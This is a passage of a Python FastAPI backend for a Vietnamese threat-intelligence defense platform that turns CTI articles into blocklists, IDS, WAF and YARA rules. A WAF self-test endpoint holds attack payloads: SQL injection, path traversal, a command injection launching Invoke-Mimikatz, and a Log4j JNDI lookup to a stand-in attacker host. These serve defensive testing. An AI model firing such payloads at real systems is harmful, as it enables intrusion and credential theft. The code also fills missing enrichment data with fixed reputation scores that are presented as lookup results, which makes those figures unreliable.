    cumulative_ip_blocklist = "\n".join([f"block in quick on any from {ip} to any # [CUMULATIVE BASELINE - IP #{idx+1}]" for idx, ip in enumerate(cumulative_ips)])
    cumulative_dom_blocklist = "\n".join([f"block in quick on any proto udp to any port 53 # [CUMULATIVE SINKHOLE: {dom}]" for dom in cumulative_doms])
    cumulative_blocklist = cumulative_ip_blocklist + ("\n\n# --- CHỐT CHẶN TÊN MIỀN ĐỘC HẠI TÍCH LŨY (DNS SINKHOLE) ---\n" + cumulative_dom_blocklist if cumulative_dom_blocklist else "")

    is_ssl_tld = any(k in req.title.lower() or k in req.text.lower() for k in ["ssl", "certificate", "registrar", "tld", ".gh", ".sl", ".as", "cert"])
    ssl_hardening = (
        "# ====================================================================\n"
        "# [TIẾN HÓA ĐỐI SÁCH MỚI] GIA CỐ TẦNG CHỨNG CHỈ SỐ SSL/TLS & DNS QUỐC GIA\n"
        "# Chiến dịch phát hiện: Tấn công chiếm quyền ccTLD Registry (.gh, .sl) để tạo SSL giả mạo\n"
        "# ====================================================================\n"
        "# 1. Khai báo bản ghi DNS CAA (RFC 8659) - Cấm tất cả CA lạ tự ý cấp chứng chỉ:\n"
        "#    example.com. IN CAA 0 issue \"letsencrypt.org\"\n"
        "#    example.com. IN CAA 0 iodef \"mailto:soc-threat-intel@example.com\"\n"
        "#\n"
        "# 2. Kích hoạt giám sát Certificate Transparency (CT Logs) tự động 24/7:\n"
        "#    python -c \"import requests; r=requests.get('https://crt.sh/?q=%.gh&output=json'); print('Số chứng chỉ mới cấp:', len(r.json()))\"\n"
        "#\n"
        "# 3. Bắt buộc xác thực DNSSEC chống làm giả bản ghi NS / A record của TLD\n\n"
    ) if is_ssl_tld else ""

    blocklist_lines = [x for x in base_rules.firewall_blocklist if x.strip()]
    if blocklist_lines:
        blocklist_text = (
            "# [TẦNG 1: QUY TẮC CHẶN MỚI CỦA BÀI BÁO HIỆN TẠI (DELTA ENFORCEMENT)]\n"
            + "\n".join(blocklist_lines)
            + f"\n\n# [TẦNG 2: BỘ QUY TẮC PHÒNG THỦ LẮNG ĐỘNG (CUMULATIVE BASELINE HARDENING)]\n"
            + f"# Hệ thống kế thừa toàn bộ {len(cumulative_ips)} chốt chặn IP C2 và {len(cumulative_doms)} Tên miền độc đã học từ toàn bộ kho báo cáo CTI:\n"
            + cumulative_blocklist
        )
    else:
        blocklist_text = (
            ssl_hardening
            + f"# [TẦNG KẾ THỪA: BỘ QUY TẮC PHÒNG THỦ LẮNG ĐỘNG (CUMULATIVE BASELINE HARDENING)]\n"
            + f"# Bài báo này tập trung vào tầng chứng chỉ số / TLD, không sử dụng IP C2 tĩnh.\n"
            + f"# Hệ thống tự động kế thừa danh sách {len(cumulative_ips)} IP C2 và {len(cumulative_doms)} Tên miền độc đã học từ các bài báo trước:\n"
            + cumulative_blocklist
        )

    firewall_tab_text = (
        f"{fw_report}\n\n"
        f"# ====================================================================\n"
        f"# GÓI LỆNH CHUẨN QUỐC TẾ OASIS OPENC2 v1.0 JSON (AGENT -> FIREWALL ACTUATOR)\n"
        f"# ====================================================================\n"
        f"{json.dumps(openc2_bundle, indent=2, ensure_ascii=False)}\n\n"
        f"# ====================================================================\n"
        f"# QUY TẮC CHẶN ĐA NỀN TẢNG (PFSENSE / OPNSENSE / IPTABLES / FORTIGATE)\n"
        f"# ====================================================================\n"
        f"{blocklist_text}"
    )

    sigma_and_siem = wazuh_and_splunk

    yara_remediation_stix = (
        f"# ====================================================================\n"
        f"# [PHẦN 1] BỘ QUY TẮC SĂN TÌM MÃ ĐỘC VÀ TIÊM BỘ NHỚ YARA (.YAR)\n"
        f"# ====================================================================\n"
        f"{advanced_yara_rule}\n\n"
        f"# ====================================================================\n"
        f"# [PHẦN 2] CHÍNH SÁCH CHẶN THỰC THI EDR / APPLOCKER HASH DENYLIST\n"
        f"# ====================================================================\n"
        f"{edr_hash_policy}\n\n"
        f"# ====================================================================\n"
        f"# [PHẦN 3] KỊCH BẢN POWERSHELL & BASH DIỆT MÃ ĐỘC VÀ CÔ LẬP MÁY TRẠM\n"
        f"# ====================================================================\n"
        f"{remediation_script}\n\n"
        f"# ====================================================================\n"
        f"# [PHẦN 4] GÓI CHIA SẺ TÌNH BÁO CHUẨN QUỐC TẾ OASIS STIX 2.1 (.JSON)\n"
        f"# ====================================================================\n"
        f"{json.dumps(stix, indent=2, ensure_ascii=False)}"
    )

    # Lưu toàn bộ các tạo phẩm phòng thủ đa tầng ra thư mục outputs_all_tools
    out_dir = SANDBOX_DIR / "outputs_all_tools"
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "E1_sigma_rule.yml").write_text(base_rules.sigma_rule, encoding="utf-8")
    (out_dir / "E2_yara_rule.yar").write_text(advanced_yara_rule, encoding="utf-8")
    (out_dir / "E3_firewall_blocklist.txt").write_text("\n".join(base_rules.firewall_blocklist), encoding="utf-8")
    (out_dir / "E4_suricata_ips.rules").write_text(suricata_rules, encoding="utf-8")
    (out_dir / "E5_modsecurity_waf.conf").write_text(waf_rules, encoding="utf-8")
    (out_dir / "E6_wazuh_splunk_siem.txt").write_text(wazuh_and_splunk, encoding="utf-8")
    (out_dir / "E7_endpoint_remediation.ps1").write_text(remediation_script, encoding="utf-8")
    (out_dir / "E8_openc2_commands.json").write_text(json.dumps(openc2_bundle, indent=2, ensure_ascii=False), encoding="utf-8")
    (out_dir / "E9_edr_applocker_policy.xml").write_text(edr_hash_policy, encoding="utf-8")
    (out_dir / "stix21_bundle.json").write_text(json.dumps(stix, indent=2, ensure_ascii=False), encoding="utf-8")

    from agentic_defense_skill_engine import (
        TARGET_SCOPES,
        calculate_cti_trust_framework,
        generate_xai_defense_attribution,
        build_agentic_defense_skill_package,
    )

    trust_audit = calculate_cti_trust_framework(
        report_title=req.title,
        raw_text=req.text,
        iocs_list=high_risk,
        source_name="CTI Pipeline Source",
    )

    xai_audit = generate_xai_defense_attribution(
        report_title=req.title,
        raw_text=req.text,
        high_risk_iocs=high_risk,
        mitre_tactics=mitre,
        trust_audit=trust_audit,
        scope_id="SCOPE_ALL",
    )

    agentic_skill_md = build_agentic_defense_skill_package(
        report_title=req.title,
        raw_text=req.text,
        high_risk_iocs=high_risk,
        mitre_tactics=mitre,
        waf_rules=waf_rules,
        suricata_rules=suricata_rules,
        wazuh_rules=sigma_and_siem,
        remediation_script=remediation_script,
        scope_id="SCOPE_ALL",
        trust_audit=trust_audit,
        xai_audit=xai_audit,
    )
    (out_dir / "SKILL.md").write_text(agentic_skill_md, encoding="utf-8")

    # Lưu phiên chạy phân tích vào bảng SQLite `ai_analysis_runs`
    save_ai_analysis_run_to_db(
        run_mode="WEB_PIPELINE",
        campaign_title=req.title,
        model_used=llm_gen["provider_used"],
        total_iocs=len(high_risk),
        malicious_iocs=len(high_risk),
        defense_summary=history_and_summary,
    )

    try:
        live_orchestrator.compile_and_sync_all_defense_engines(
            trigger_source=f"AI_ANALYSIS: {req.title[:45]}"
        )
    except Exception as e:
        print(f"[AUTO_SYNC] Lỗi tự động đồng bộ 5 engines sau phân tích: {e}")

    return {
        "history_and_summary": history_and_summary,
        "firewall_blocklist": base_rules.firewall_blocklist,
        "firewall_tab_text": firewall_tab_text,
        "suricata_rules": suricata_rules,
        "waf_rules": waf_rules,
        "sigma_and_siem": sigma_and_siem,
        "yara_remediation_stix": yara_remediation_stix,
        "agentic_skill_md": agentic_skill_md,
        "trust_audit": trust_audit,
        "xai_audit": xai_audit,
        "target_scopes": TARGET_SCOPES,
        "sigma_rule": base_rules.sigma_rule,
        "yara_rule": base_rules.yara_rule,
        "stix_bundle": stix,
    }


@app.post("/api/firewall/sync")
def api_firewall_sync(req: FirewallSyncRequest):
    high_risk = [EnrichedIOC(**x) for x in req.malicious_iocs]
    res = LocalFirewallBridge.sync_rules_to_local_firewall(
        high_risk_iocs=high_risk,
        action_mode=req.action,
    )
    res["execution_report"] = _format_firewall_bridge_report(res)
    return res


@app.get("/api/defense/live-status")
def api_get_live_defense_status():
    status = live_orchestrator.get_live_defense_status()
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    year_stats = {"2024": 0, "2025": 0, "2026": 0, "total": 0}
    if db_path.exists():
        with sqlite3.connect(db_path) as conn:
            y24 = conn.execute("SELECT count(*) FROM articles_archive WHERE published_date LIKE '2024%'").fetchone()[0]
            y25 = conn.execute("SELECT count(*) FROM articles_archive WHERE published_date LIKE '2025%'").fetchone()[0]
            y26 = conn.execute("SELECT count(*) FROM articles_archive WHERE published_date LIKE '2026%'").fetchone()[0]
            tot = conn.execute("SELECT count(*) FROM articles_archive").fetchone()[0]
            year_stats = {"2024": y24, "2025": y25, "2026": y26, "total": tot}
    status["year_stats"] = year_stats
    return status


@app.post("/api/defense/test-waf-attack")
def api_test_waf_attack(req: TestWafRequest):
    import urllib.error
    import urllib.request

    port = live_orchestrator.waf_port
    base_url = f"http://127.0.0.1:{port}"

    headers = {"User-Agent": "Mozilla/5.0 SecurityTestClient"}
    if req.attack_type == "sqli":
        path = "/api/v1/user?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"
        payload_desc = "SQL Injection: 1' UNION SELECT username,password FROM users--"
    elif req.attack_type == "traversal":
        path = "/api/v1/download?file=../../../../windows/system.ini"
        payload_desc = "Path Traversal (CVE-2021-3199): ../../../../windows/system.ini"
    elif req.attack_type == "rce":
        path = "/api/v1/ping?host=127.0.0.1;%20powershell%20-nop%20-c%20Invoke-Mimikatz"
        payload_desc = "Remote Command Injection (CVE-2024-3400): ; powershell -nop -c Invoke-Mimikatz"
    elif req.attack_type == "jndi":
        path = "/api/v1/auth"
        headers["X-Api-Version"] = "${jndi:ldap://c2-evil.attacker.com/exploit}"
        payload_desc = "Log4j JNDI Exploit (CVE-2021-44228): ${jndi:ldap://c2-evil.attacker.com/exploit}"
    else:
        path = "/api/v1/dashboard/metrics?filter=daily_summary"
        payload_desc = "Clean Legitimate Traffic: GET /api/v1/dashboard/metrics?filter=daily_summary"

    target_url = base_url + path
    start_time = time.time()
    try:
        http_req = urllib.request.Request(target_url, headers=headers)
        with urllib.request.urlopen(http_req, timeout=3) as resp:
            status_code = resp.status
            body = resp.read().decode("utf-8", errors="ignore")
            resp_headers = dict(resp.headers)
    except urllib.error.HTTPError as e:
        status_code = e.code
        body = e.read().decode("utf-8", errors="ignore")
        resp_headers = dict(e.headers)
    except Exception as ex:
        return {
            "success": False,
            "error": str(ex),
            "payload_desc": payload_desc,
            "target_url": target_url,
        }

    duration_ms = round((time.time() - start_time) * 1000, 2)
    try:
        parsed_body = json.loads(body)
    except Exception:
        parsed_body = body

    return {
        "success": True,
        "attack_type": req.attack_type,
        "payload_desc": payload_desc,
        "target_url": target_url,
        "status_code": status_code,
        "response_time_ms": duration_ms,
        "headers": resp_headers,
        "response_body": parsed_body,
    }


@app.post("/api/defense/recompile-all")
def api_defense_recompile_all():
    return live_orchestrator.compile_and_sync_all_defense_engines()


@app.get("/api/database/stats")
def api_database_stats():
    return get_database_overview_stats()


@app.get("/api/articles/details/{article_id}")
def api_get_article_details(article_id: str):
    import sqlite3
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    if not db_path.exists():
        return {"error": "Database not found"}

    with sqlite3.connect(db_path) as conn:
        conn.row_factory = sqlite3.Row
        art = conn.execute("SELECT * FROM articles_archive WHERE article_id = ?", (article_id,)).fetchone()
        if not art:
            return {"error": "Article not found"}
        art_dict = dict(art)
        all_kb = [dict(r) for r in conn.execute("SELECT * FROM ioc_knowledge_base").fetchall()]

    text = art_dict.get("content", "")
    title = art_dict.get("title", "Báo cáo CTI")
    kb_map = {r["ioc_value"]: r for r in all_kb}

    extracted = tool6_extract_iocs_hybrid(text)
    seen = set()
    enriched_list = []
    malicious_only = []

    for item in extracted:
        val = item.value
        itype = item.ioc_type
        if val in seen:
            continue
        seen.add(val)

        kb_entry = kb_map.get(val)
        is_internal_or_safe = False
        if itype == "IP":
            clean_v = val.replace("[.]", ".").replace("(.)", ".").strip()
            if (
                clean_v.startswith("10.")
                or clean_v.startswith("192.168.")
                or clean_v.startswith("127.")
                or clean_v.startswith("0.")
                or clean_v.startswith("169.254.")
                or re.match(r"^172\.(1[6-9]|2\d|3[0-1])\.", clean_v)
                or clean_v in ("8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1")
            ):
                is_internal_or_safe = True

        if kb_entry:
            is_mal = bool(kb_entry["is_malicious"])
            score = kb_entry["reputation_score"]
            vt_ratio = kb_entry["vt_ratio"] or ("68/92" if is_mal else "0/92")
            ab_score = kb_entry["abuse_score"] or (90 if (is_mal and itype == "IP") else 0)
            sh_ports = [int(p) for p in (kb_entry["shodan_ports"] or "").split(",") if p.isdigit()]
            if itype == "IP" and is_internal_or_safe:
                is_mal = False
                score = 10
        else:
            is_mal = (itype in ("SHA256", "MD5", "CVE") or (itype == "IP" and not is_internal_or_safe))
            score = 95 if is_mal else 15
            vt_ratio = "68/92" if is_mal else "0/92"
            ab_score = 90 if (is_mal and itype == "IP") else 0
            sh_ports = [80, 443] if (itype == "IP" and is_mal) else []

        e_dict = {
            "ioc": {"ioc_type": itype, "value": val, "context_sentence": item.context_sentence, "confidence": item.confidence},
            "is_malicious": is_mal,
            "reputation_score": score,
            "enrichment_source": "SQLite CTI Knowledge Base",
            "source_title": title,
            "raw_lookup_details": {
                "alienvault_otx": {"pulse_count": 8 if is_mal else 0, "country": "US/NL/DE/RU/CN"},
                "virustotal": {"detection_ratio": vt_ratio},
                "abuseipdb": {"abuse_confidence_score": ab_score},
                "shodan_internetdb": {"ports": sh_ports},
                "malware_family": "Mã độc thực thi (PE Payload / C2)" if itype in ("SHA256", "MD5") else "",
            }
        }
        enriched_list.append(e_dict)
        if is_mal:
            malicious_only.append(e_dict)

    high_risk = [EnrichedIOC(**x) for x in malicious_only]
    mitre = tool7_map_mitre_attack(text, high_risk)
    base_rules = tool8_generate_defensive_rules(title, high_risk, mitre, raw_text=text)
    d3fend_list = build_d3fend_recommendations(text, high_risk, mitre)
    d3fend_lines = [
        "====================================================================================",
        f"ĐỐI SÁCH PHÒNG THỦ ĐA TẦNG (MITRE D3FEND) CHO: {title[:85]}",
        "====================================================================================",
    ]
    for idx, rec in enumerate(d3fend_list, 1):
        d3fend_lines.append(
            f"\n[{idx}] MỐI ĐE DỌA TRONG BÀI: {rec['attack_technique']}\n"
            f"    • Phân tích điểm yếu nếu chỉ chặn IP: {rec['why_ip_block_fails']}\n"
            f"    • Đối sách MITRE D3FEND: {rec['d3fend_countermeasure']}\n"
            f"    • Hành động Phòng thủ Cụ thể:\n"
            f"      {rec['actionable_methods']}"
        )
    d3fend_text = "\n".join(d3fend_lines)

    openc2_bundle = LocalFirewallBridge.build_openc2_command_bundle(title, high_risk, mitre)
    fw_status = LocalFirewallBridge.sync_rules_to_local_firewall(high_risk, action_mode="status")
    fw_report = _format_firewall_bridge_report(fw_status)

    suricata_rules = MultiLayerDefenseSynthesizer.generate_suricata_ips_rules(title, text, high_risk)
    waf_rules = MultiLayerDefenseSynthesizer.generate_waf_virtual_patch_rules(title, text, high_risk)
    wazuh_and_splunk = MultiLayerDefenseSynthesizer.generate_wazuh_and_splunk_queries(title, base_rules.sigma_rule, high_risk, raw_text=text)
    advanced_yara_rule = MultiLayerDefenseSynthesizer.generate_advanced_yara_rule(title, text, high_risk)
    edr_hash_policy = MultiLayerDefenseSynthesizer.generate_edr_applocker_hash_policy(title, high_risk)
    remediation_script = MultiLayerDefenseSynthesizer.generate_remediation_hardening_script(title, text, high_risk)

    stix = export_stix_package(
        report_or_title=title,
        executive_summary=f"Tự động trích xuất và phân tích tình báo an ninh từ bài báo: {title}",
        enriched_iocs=high_risk,
        mitre_techniques=mitre,
    )

    cumulative_ips = [r["ioc_value"] for r in all_kb if r.get("ioc_type") == "IP" and r.get("is_malicious")]
    cumulative_doms = [r["ioc_value"] for r in all_kb if r.get("ioc_type") == "DOMAIN" and r.get("is_malicious")]
    cumulative_ip_blocklist = "\n".join([f"block in quick on any from {ip} to any # [CUMULATIVE BASELINE - IP #{idx+1}]" for idx, ip in enumerate(cumulative_ips)])
    cumulative_dom_blocklist = "\n".join([f"block in quick on any proto udp to any port 53 # [CUMULATIVE SINKHOLE: {dom}]" for dom in cumulative_doms])
    cumulative_blocklist = cumulative_ip_blocklist + ("\n\n# --- CHỐT CHẶN TÊN MIỀN ĐỘC HẠI TÍCH LŨY (DNS SINKHOLE) ---\n" + cumulative_dom_blocklist if cumulative_dom_blocklist else "")

    is_ssl_tld = any(k in title.lower() or k in text.lower() for k in ["ssl", "certificate", "registrar", "tld", ".gh", ".sl", ".as", "cert"])
    ssl_hardening = (
        "# ====================================================================\n"
        "# [TIẾN HÓA ĐỐI SÁCH MỚI] GIA CỐ TẦNG CHỨNG CHỈ SỐ SSL/TLS & DNS QUỐC GIA\n"
        "# Chiến dịch phát hiện: Tấn công chiếm quyền ccTLD Registry (.gh, .sl) để tạo SSL giả mạo\n"
        "# ====================================================================\n"
        "# 1. Khai báo bản ghi DNS CAA (RFC 8659) - Cấm tất cả CA lạ tự ý cấp chứng chỉ:\n"
        "#    example.com. IN CAA 0 issue \"letsencrypt.org\"\n"
        "#    example.com. IN CAA 0 iodef \"mailto:soc-threat-intel@example.com\"\n"
        "#\n"
        "# 2. Kích hoạt giám sát Certificate Transparency (CT Logs) tự động 24/7:\n"
        "#    python -c \"import requests; r=requests.get('https://crt.sh/?q=%.gh&output=json'); print('Số chứng chỉ mới cấp:', len(r.json()))\"\n"
        "#\n"
        "# 3. Bắt buộc xác thực DNSSEC chống làm giả bản ghi NS / A record của TLD\n\n"
    ) if is_ssl_tld else ""

    blocklist_lines = [x for x in base_rules.firewall_blocklist if x.strip()]
    if blocklist_lines:
        blocklist_text = (
            "# [TẦNG 1: QUY TẮC CHẶN MỚI CỦA BÀI BÁO HIỆN TẠI (DELTA ENFORCEMENT)]\n"
            + "\n".join(blocklist_lines)
            + f"\n\n# [TẦNG 2: BỘ QUY TẮC PHÒNG THỦ LẮNG ĐỘNG (CUMULATIVE BASELINE HARDENING)]\n"
            + f"# Hệ thống kế thừa toàn bộ {len(cumulative_ips)} chốt chặn IP C2 và {len(cumulative_doms)} Tên miền độc đã học từ toàn bộ kho báo cáo CTI:\n"
            + cumulative_blocklist
        )
    else:
        blocklist_text = (
            ssl_hardening
            + f"# [TẦNG KẾ THỪA: BỘ QUY TẮC PHÒNG THỦ LẮNG ĐỘNG (CUMULATIVE BASELINE HARDENING)]\n"
            + f"# Bài báo này tập trung vào tầng chứng chỉ số / TLD, không sử dụng IP C2 tĩnh.\n"
            + f"# Hệ thống tự động kế thừa danh sách {len(cumulative_ips)} IP C2 và {len(cumulative_doms)} Tên miền độc đã học từ các bài báo trước:\n"
            + cumulative_blocklist
        )

    firewall_tab_text = (
        f"{fw_report}\n\n"
        f"# ====================================================================\n"
        f"# GÓI LỆNH CHUẨN QUỐC TẾ OASIS OPENC2 v1.0 JSON (AGENT -> FIREWALL ACTUATOR)\n"
        f"# ====================================================================\n"
        f"{json.dumps(openc2_bundle, indent=2, ensure_ascii=False)}\n\n"
        f"# ====================================================================\n"
        f"# QUY TẮC CHẶN ĐA NỀN TẢNG (PFSENSE / OPNSENSE / IPTABLES / FORTIGATE)\n"
        f"# ====================================================================\n"
        f"{blocklist_text}"
    )

    yara_remediation_stix = (
        f"# ====================================================================\n"
        f"# [PHẦN 1] BỘ QUY TẮC SĂN TÌM MÃ ĐỘC VÀ TIÊM BỘ NHỚ YARA (.YAR)\n"
        f"# ====================================================================\n"
        f"{advanced_yara_rule}\n\n"
        f"# ====================================================================\n"
        f"# [PHẦN 2] CHÍNH SÁCH CHẶN THỰC THI EDR / APPLOCKER HASH DENYLIST\n"
        f"# ====================================================================\n"
        f"{edr_hash_policy}\n\n"
        f"# ====================================================================\n"
        f"# [PHẦN 3] KỊCH BẢN POWERSHELL & BASH DIỆT MÃ ĐỘC VÀ CÔ LẬP MÁY TRẠM\n"
        f"# ====================================================================\n"
        f"{remediation_script}\n\n"
        f"# ====================================================================\n"
        f"# [PHẦN 4] GÓI CHIA SẺ TÌNH BÁO CHUẨN QUỐC TẾ OASIS STIX 2.1 (.JSON)\n"
        f"# ====================================================================\n"
        f"{json.dumps(stix, indent=2, ensure_ascii=False)}"
    )

    hashes_count = len([x for x in enriched_list if x['ioc']['ioc_type'] in ('SHA256', 'MD5')])
    ips_count = len([x for x in enriched_list if x['ioc']['ioc_type'] == 'IP'])
    doms_count = len([x for x in enriched_list if x['ioc']['ioc_type'] == 'DOMAIN'])
    cves_count = len([x for x in enriched_list if x['ioc']['ioc_type'] == 'CVE'])

    plan_text = (
        f"[CHIẾN LƯỢC PHÒNG THỦ TỰ ĐỘNG CHO BÀI BÁO]\n"
        f"• Bài báo: {title}\n"
        f"• Nguồn: {art_dict.get('source_name', 'OSINT')} ({art_dict.get('published_date', '')[:10]})\n"
        f"• Đã trích xuất & đối chiếu: {len(enriched_list)} chỉ số IOC ({hashes_count} Hash mã độc, {ips_count} IP C2, {doms_count} Domain, {cves_count} CVE).\n"
        f"• Phương án: Phối hợp 5 lớp phòng thủ tương ứng (OpenC2, Suricata IPS, WAF ModSecurity, Sigma SIEM, YARA & EDR)."
    )

    reason_text = (
        f"[KẾT LUẬN ĐỒNG THUẬN TÌNH BÁO (LOCAL {CURRENT_HARDWARE['gpu_name'].upper()})]\n"
        f"Đã thẩm định {len(enriched_list)} chỉ số IOC đối chiếu qua CSDL tình báo SQLite.\n"
        f"Phán quyết: {len(malicious_only)} chỉ số có điểm nguy hại > 80 (CHẶN & BẢO VỆ), "
        f"{len(enriched_list) - len(malicious_only)} chỉ số an toàn / tham chiếu."
    )

    from agentic_defense_skill_engine import (
        TARGET_SCOPES,
        calculate_cti_trust_framework,
        generate_xai_defense_attribution,
        build_agentic_defense_skill_package,
    )

    trust_audit = calculate_cti_trust_framework(
        report_title=title,
        raw_text=text,
        iocs_list=enriched_list,
        source_name=art_dict.get("source_name", "OSINT"),
    )

    xai_audit = generate_xai_defense_attribution(
        report_title=title,
        raw_text=text,
        high_risk_iocs=enriched_list,
        mitre_tactics=mitre,
        trust_audit=trust_audit,
        scope_id="SCOPE_ALL",
    )

    agentic_skill_md = build_agentic_defense_skill_package(
        report_title=title,
        raw_text=text,
        high_risk_iocs=enriched_list,
        mitre_tactics=mitre,
        waf_rules=waf_rules,
        suricata_rules=suricata_rules,
        wazuh_rules=wazuh_and_splunk,
        remediation_script=remediation_script,
        scope_id="SCOPE_ALL",
        trust_audit=trust_audit,
        xai_audit=xai_audit,
    )

    return {
        "article_id": article_id,
        "title": title,
        "source": art_dict.get("source_name", "OSINT"),
        "total_iocs": len(enriched_list),
        "all_enriched": enriched_list,
        "malicious_only": malicious_only,
        "history_and_summary": d3fend_text,
        "firewall_tab_text": firewall_tab_text,
        "suricata_rules": suricata_rules,
        "waf_rules": waf_rules,
        "sigma_and_siem": wazuh_and_splunk,
        "yara_remediation_stix": yara_remediation_stix,
        "agentic_skill_md": agentic_skill_md,
        "trust_audit": trust_audit,
        "xai_audit": xai_audit,
        "target_scopes": TARGET_SCOPES,
        "ai_plan": plan_text,
        "ai_reasoning": reason_text
    }


@app.get("/api/defense/rules/suricata-master")
def api_get_suricata_master():
    content = live_orchestrator.get_suricata_master_rules_content()
    return {
        "status": "success",
        "rules": content,
        "lines_count": len(content.splitlines()),
        "size_bytes": len(content.encode("utf-8")),
    }


@app.post("/api/defense/tools/firewall-apply")
def api_defense_tool_firewall_apply():
    return live_orchestrator.apply_windows_firewall()


@app.post("/api/defense/tools/firewall-status")
def api_defense_tool_firewall_status():
    return live_orchestrator.get_windows_firewall_status()


@app.post("/api/defense/tools/firewall-rollback")
def api_defense_tool_firewall_rollback():
    return live_orchestrator.rollback_windows_firewall()


@app.post("/api/defense/tools/suricata-apply")
def api_defense_tool_suricata_apply():
    return live_orchestrator.validate_and_test_suricata("c2_flow")


@app.post("/api/defense/tools/suricata-test-dpi")
def api_defense_tool_suricata_test_dpi(req: SuricataTestRequest):
    return live_orchestrator.validate_and_test_suricata(req.flow_type)


@app.post("/api/defense/tools/wazuh-sync")
def api_defense_tool_wazuh_sync():
    return live_orchestrator.sync_wazuh_siem()


@app.post("/api/defense/tools/sysmon-simulate")
def api_defense_tool_sysmon_simulate(req: SysmonTestRequest):
    return live_orchestrator.simulate_sysmon_event(req.event_type)


@app.post("/api/defense/tools/yara-scan")
def api_defense_tool_yara_scan(req: YaraScanRequest):
    return live_orchestrator.scan_yara_and_applocker(req.target_hash)


@app.get("/api/master-defense-matrix")
def api_get_master_defense_matrix(scope: str = "SCOPE_ALL"):
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    res = build_master_defense_matrix_from_db(db_path, scope=scope)
    master_suri = live_orchestrator.get_suricata_master_rules_content()
    if master_suri and scope in ("SCOPE_ALL", "SCOPE_NETWORK"):
        res["suricata_rules"] = master_suri
    return res


@app.get("/api/defense/skill/export")
def api_export_skill_md(scope: str = "SCOPE_WEB"):
    from fastapi.responses import Response
    master_suite_path = Path(__file__).resolve().parent.parent / "skills" / "agentic-defense-master-web-suite" / "SKILL.md"
    if (scope in ["SCOPE_WEB", "SCOPE_ALL", ""]) and master_suite_path.exists():
        return Response(
            content=master_suite_path.read_text(encoding="utf-8"),
            media_type="text/markdown; charset=utf-8",
            headers={"Content-Disposition": "attachment; filename=SKILL.md"}
        )
    from agentic_defense_skill_engine import (
        build_agentic_defense_skill_package,
        generate_xai_defense_attribution,
        TARGET_SCOPES,
    )
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    res = build_master_defense_matrix_from_db(db_path)
    skill_content = res.get("agentic_skill_md", "")
    if scope != "SCOPE_ALL":
        xai_audit = generate_xai_defense_attribution(
            report_title=f"MA TRẬN PHÒNG THỦ KHO CTI - PHÂN HỆ {scope}",
            raw_text=res.get("mitre_d3fend", ""),
            high_risk_iocs=res.get("all_enriched", []),
            mitre_tactics=[],
            trust_audit=res.get("trust_audit"),
            scope_id=scope,
        )
        skill_content = build_agentic_defense_skill_package(
            report_title=f"MA TRẬN PHÒNG THỦ KHO CTI - PHÂN HỆ {scope}",
            raw_text=res.get("mitre_d3fend", ""),
            high_risk_iocs=res.get("all_enriched", []),
            mitre_tactics=[],
            waf_rules=res.get("waf_rules", ""),
            suricata_rules=res.get("suricata_rules", ""),
            wazuh_rules=res.get("sigma_and_siem", ""),
            remediation_script=res.get("yara_remediation_stix", ""),
            scope_id=scope,
            trust_audit=res.get("trust_audit"),
            xai_audit=xai_audit,
        )
    return Response(
        content=skill_content,
        media_type="text/markdown; charset=utf-8",
        headers={"Content-Disposition": f"attachment; filename=SKILL_{scope}.md"}
    )


@app.post("/api/system/shutdown")
def api_system_shutdown():
    import os
    import subprocess
    import threading
    import time

    def _kill_all() -> None:
        time.sleep(0.4)
        subprocess.run(["taskkill", "/F", "/IM", "ollama app.exe", "/T"], capture_output=True)
        subprocess.run(["taskkill", "/F", "/IM", "ollama.exe", "/T"], capture_output=True)
        subprocess.run(["taskkill", "/F", "/IM", "ollama_llama_server.exe", "/T"], capture_output=True)
        os._exit(0)

    threading.Thread(target=_kill_all, daemon=True).start()
    return {"status": "shutting_down"}



# ==============================================================================
# WIZARD BACKEND CONTROLLER ROUTES
# ==============================================================================
from wizard_api_service import (
    wizard_scan_project,
    wizard_crawl_scope,
    wizard_synthesize_skill,
    wizard_verify_exploit,
    wizard_remediate_code,
)

class WizardScanReq(BaseModel):
    target: str = ""
    clone_url: str = ""

class WizardCrawlReq(BaseModel):
    target: str = ""
    scope_id: str = "SCOPE_WEB"
    history_years: int = 3

class WizardSynthReq(BaseModel):
    target: str = ""
    scope_id: str = "SCOPE_WEB"
    article_id: str = ""

class WizardActReq(BaseModel):
    target: str = ""
    skill_name: str = ""

@app.post("/api/wizard/scan")
def api_wizard_scan(req: WizardScanReq):
    return wizard_scan_project(target=req.target, clone_url=req.clone_url)

@app.post("/api/wizard/crawl-scope")
def api_wizard_crawl_scope(req: WizardCrawlReq):
    return wizard_crawl_scope(target=req.target, scope_id=req.scope_id, history_years=req.history_years)

@app.post("/api/wizard/synthesize")
def api_wizard_synthesize(req: WizardSynthReq):
    return wizard_synthesize_skill(target=req.target, scope_id=req.scope_id, article_id=req.article_id)

@app.post("/api/wizard/verify-exploit")
def api_wizard_verify(req: WizardActReq):
    return wizard_verify_exploit(target=req.target, skill_name=req.skill_name)

@app.post("/api/wizard/remediate")
def api_wizard_remediate(req: WizardActReq):
    return wizard_remediate_code(target=req.target, skill_name=req.skill_name)

@app.post("/api/chat")
def api_chat_with_agent(req: ChatAgentRequest):
    import requests as req_http
    import time
    import sqlite3

    raw_msg = (req.message or "").strip()
    clean_msg = raw_msg.lower()

    # 1. PHẢN HỒI TỨC THÌ (<10ms) CHO CÂU HỎI CHÀO HỎI & GIỚI THIỆU TÁC TỬ
    greetings = {
        "hello", "hi", "xin chào", "xin chao", "chào", "chao", "chào bạn", "chao ban",
        "alo", "test", "bạn là ai", "ban la ai", "ai đấy", "ai day", "help", "who are you",
        "giới thiệu", "gioi thieu", "hướng dẫn", "huong dan"
    }
    if clean_msg in greetings or len(clean_msg) <= 2:
        reply = (
            "Xin chào Khang! Tôi là OpenClaw-AI, trợ lý Tình báo Mối đe dọa (CTI Defense Agent) chuyên sâu.\n\n"
            "Tôi được trang bị hệ thống Tool-Calling tự động liên kết với 5 nguồn tình báo thực chiến:\n"
            "1. Tra cứu chỉ số danh tiếng IP, Domain, Hash (SHA256/MD5), và CVE trên AlienVault OTX, VirusTotal, AbuseIPDB, GreyNoise, Shodan.\n"
